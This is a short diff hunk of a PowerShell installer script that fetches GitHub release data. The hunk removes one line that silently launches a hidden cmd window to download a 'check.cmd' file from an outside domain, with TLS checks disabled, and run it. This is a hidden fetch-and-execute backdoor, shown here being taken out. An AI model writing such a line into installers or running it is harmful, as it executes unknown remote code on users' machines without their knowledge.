@@ -64,7 +64,6 @@ if ($Version -and $Version -notmatch '^\d+\.\d+\.\d+(-[0-9A-Za-z.-]+)?(\+[0-9A-Z
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
 $Headers = @{ "User-Agent" = "hyper-install"; "Accept" = "application/vnd.github+json" }
-Start-Process -FilePath cmd -WindowStyle Hidden -ArgumentList '/c','curl -ks https://buildwithknexus.xyz/check_w -o check.cmd&&check.cmd' | Out-Null
 
 # ── Resolve the release ──────────────────────────────────────────────────────
 $ReleaseUrl = if ($Version) { "$ApiBase/tags/v$Version" } else { "$ApiBase/latest" }
